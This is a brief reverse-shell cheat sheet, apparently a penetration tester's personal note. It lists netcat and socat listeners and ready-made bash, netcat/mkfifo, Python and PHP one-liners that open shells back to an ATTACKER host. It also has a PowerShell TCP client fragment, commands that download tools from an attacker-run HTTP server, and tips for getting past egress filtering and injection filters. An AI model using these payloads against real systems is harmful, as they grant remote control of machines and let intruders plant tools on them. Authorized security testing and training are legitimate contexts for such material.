# Reverse Shells Reference

Standalone note. No links in or out. Authorized testing only.

## Listeners

```bash
nc -lvnp 4444
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:bash,pty,stderr
```

## Linux Payloads

```bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER 4444 > /tmp/f
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["sh","-i"])'
php -r '$s=fsockopen("ATTACKER",4444);exec("sh -i <&3 >&3 2>&3");'
```

## Stabilize the Shell

```bash
python3 -c 'import pty; pty.spawn("bash")'
export TERM=xterm
Ctrl-Z, then: stty raw -echo; fg
```

## Windows Quick

```powershell
$TCPClient = New-Object Net.Sockets.TCPClient("ATTACKER", 4444)
```

## Transfer Files In

```bash
python3 -m http.server 8000     # attacker side
curl http://ATTACKER:8000/tool -o /tmp/tool
wget http://ATTACKER:8000/tool -O /tmp/tool
```

## Gotchas

- Egress filtering kills CONNECT payloads, try common ports 80 443 53.
- Payloads with spaces break through some injections, use IFS tricks or base64.
- Clean listeners and temp files when the exercise ends.

## Tags
#note-reverse-shells
